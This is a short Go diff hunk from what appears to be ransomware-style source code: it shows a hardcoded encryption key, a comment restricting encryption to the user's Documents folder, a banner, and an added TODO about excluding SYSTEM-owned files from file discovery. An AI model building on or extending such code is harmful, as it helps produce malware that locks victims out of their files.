@@ -34,6 +34,7 @@ func main() {
 	// 32 Bit Encryption Password.
 	key := "yjXTF0KtaEk3wOTdV2IZWbazSZPP8JMM"
 	// Only encrypt files and folders in this directory & subdirectories.
+	// TODO: Update File discovery to exclude SYSTEM owned files.
 	rootDir := userHomeDir() + "\\Documents\\"
 	// Art Banner
 	banner := color.Red.Sprint(`
